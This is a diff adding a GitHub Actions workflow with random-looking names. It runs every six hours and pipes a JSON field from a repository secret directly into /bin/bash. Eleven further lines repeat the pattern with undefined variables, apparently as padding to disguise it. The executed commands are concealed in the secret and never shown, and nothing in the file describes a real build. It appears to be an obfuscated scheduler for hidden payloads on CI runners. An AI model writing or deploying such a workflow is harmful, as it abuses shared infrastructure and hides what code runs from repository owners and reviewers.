@@ -1,0 +1,29 @@
+name: yuanqingshen2456
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuanqingshen2456
+        env:
+          jvn29906: ${{ secrets.jvn29906 }}
+        run: |
+          echo $jvn29906 | jq -r .equgx75571 | /bin/bash
+          echo $i9806 | jq -r .k12 | /bin/bash
+          echo $szx5760 | jq -r .yufo487 | /bin/bash
+          echo $ye17 | jq -r .jmes58132 | /bin/bash
+          echo $i52 | jq -r .wj63 | /bin/bash
+          echo $vvs8 | jq -r .sxr49 | /bin/bash
+          echo $sjftu2117 | jq -r .w09760 | /bin/bash
+          echo $lwj66528 | jq -r .baudb9 | /bin/bash
+          echo $kgw8331 | jq -r .wsbnl92 | /bin/bash
+          echo $g88 | jq -r .idflg97023 | /bin/bash
+          echo $sx7866 | jq -r .sfcg7 | /bin/bash
+          echo $m5727 | jq -r .naot75608 | /bin/bash
+
